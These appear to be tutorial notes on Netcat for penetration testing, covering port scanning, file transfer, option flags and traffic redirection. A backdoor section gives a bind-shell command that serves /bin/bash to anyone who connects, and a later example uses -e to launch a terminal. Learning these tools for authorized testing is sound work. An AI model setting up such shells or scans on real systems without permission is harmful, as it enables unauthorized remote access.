# 4_Hands-on Penetration Testing with Netcat

Netcat, also known as "the Swiss Army knife of networking," is a versatile tool used for network exploration, administration, and security testing. It is a command-line utility that can read and write data across network connections using TCP or UDP protocols. Netcat can be used for port scanning, port forwarding, file transfer, and backdoor access testing. In this hands-on tutorial, we will explore how to use Netcat for penetration testing.

## Prerequisites

Before we proceed, make sure that you have installed Netcat on your system. It is available for Windows, Linux, and macOS. You can download it from the official website or install it using your package manager.

## Netcat Basics

Netcat can be used in two modes: client and server. In client mode, Netcat sends data to a remote server, while in server mode, it listens for incoming connections. By default, Netcat uses TCP protocol for data transfer.

To start Netcat in server mode, use the following command:

```
nc -l -p {port_number}

```

This command will start Netcat in listening mode on the specified port number.

To start Netcat in client mode, use the following command:

```
nc {server_ip} {port_number}

```

This command will connect Netcat to the remote server on the specified IP address and port number.

## Netcat for Port Scanning

Netcat can be used to scan open ports on a remote server. To scan for open TCP ports, use the following command:

```
nc -z {server_ip} {starting_port}-{ending_port}

```

This command will scan for open ports between the starting and ending port numbers on the specified IP address.

## Netcat for Backdoor Access

Netcat can be used to create backdoor access to a remote server. To create a backdoor, start Netcat in server mode on the remote server using the following command:

```
nc -l -p {port_number} -e /bin/bash

```

This command will start Netcat in listening mode on the specified port number and execute a bash shell.

To connect to the backdoor, start Netcat in client mode on your system using the following command:

```
nc {server_ip} {port_number}

```

This command will connect Netcat to the remote server's backdoor and give you access to the bash shell.

## Conclusion

Netcat is a powerful tool that can be used for a variety of network tasks, including penetration testing. In this tutorial, we covered some basic Netcat commands for port scanning and backdoor access. With practice, you can use Netcat to perform more advanced network security testing.

# Understanding Command Options in Netcat

- Netcat is available in different versions and operating systems and for this we have
some specifics options available onlv in some Netcat versions.

The main options present in most versions of Netcat are:

- `-h` (Help | Version)
- `-v` (Verbosity)
- `-l` (Listen mode/Server mode)
- `-e` (Allows to execute a specific program when a client connects to it)
- `-k` (Accept multiple connections - ncat edition)
- `-o` (Hex dump of traffic)
- `-r` (Randomize ports - GNU edition)
- `-u` (UDP mode)
- `-w [seconds]` (Wait timeout)
- `-z` (Zero-1/O mode, report connection status)

Note that some options may only be available in specific versions of Netcat.

## Examples

- `netcat -vlp 12345` → listening to port 12345
    - `netcat -vlp 12345` sets up Netcat **as a server** and listens for incoming connections on port number 12345.
    - `netcat -v *localhost* 12345` sets up Netcat **as a client** and connects to the server running on localhost (your own system) on port number 12345, displaying verbose output.
        
        → [`localhost`](http://localhost) can be replaced by any other ip address on the network
        
- `netcat -vklp` sets up Netcat in server mode with verbosity, **multiple** connections, and listening on any available port.
    - `netcat -vklp` == `netcat -v -k -l -p`
    - 
- flag `-e`
    
    ```
    nc -vlp {port_number} -e **/usr/bin/x-terminal-emulator**
    ```
    
    This command will start Netcat in listening mode on the specified port number and execute the Kali Linux terminal when a client connects to it.
    
    - It will execute the terminal from the directory which `netcat` command was executed.
- Use the `-o` option to create a hex dump of the traffic. For example:
    
    ```
    nc -vlp 12345 -o dump.hex
    
    ```
    
    This command will listen for incoming connections on port number 12345 and create a hex dump of the traffic in a file named `dump.hex`. → saves all communications
    
- `nc -vlrw10`
    - `r` : randomize source port
    - `w 10` : timeout after 10 seconds of inactivity
- `nc -vnw3z {ip address} {port range}` → will perform a zero-I/O port scan on the specified IP address and port range. It will not send any data, but it will report the connection status for each port in the range. The `-v` option enables verbose output, the `-n` option disables DNS resolution, the `-w3` option sets a 3-second timeout for each connection attempt, and the `-z` option performs a zero-I/O scan. The `command` argument is optional and specifies a command to execute when a connection is made.

# Basic Operatins in Netcat

Netcat is a versatile networking tool that can be used for a variety of tasks, including:

- Creating a simple chat interface
- Port scanning
- Transferring files
- Banner grabbing
- Redirecting ports and traffic

- Use `nc -vvi1z {ip} {port range}` for a zero-I/O port scan on the specified IP address and port range. `-v` enables verbose output, `-i1` sets a one-second delay between each connection attempt, and `-z` performs a zero-I/O scan.
- To redirect input from a file to Netcat, use:
    
    ```
    nc -l {port} < {filename}
    
    ```
    
    To redirect output from Netcat to a file, use:
    
    ```
    nc {server_ip} {port} > {filename}
    
    ```
    

- `nc -vlp {port} | nc {ip} {port2}` → This command allows you to redirect the output of Netcat running in listen mode on port `{port}` to Netcat running in client mode and connected to IP address `{ip}` on port number `{port2}`. The output of Netcat running in listen mode will be sent to Netcat running in client mode on the specified IP address and port number.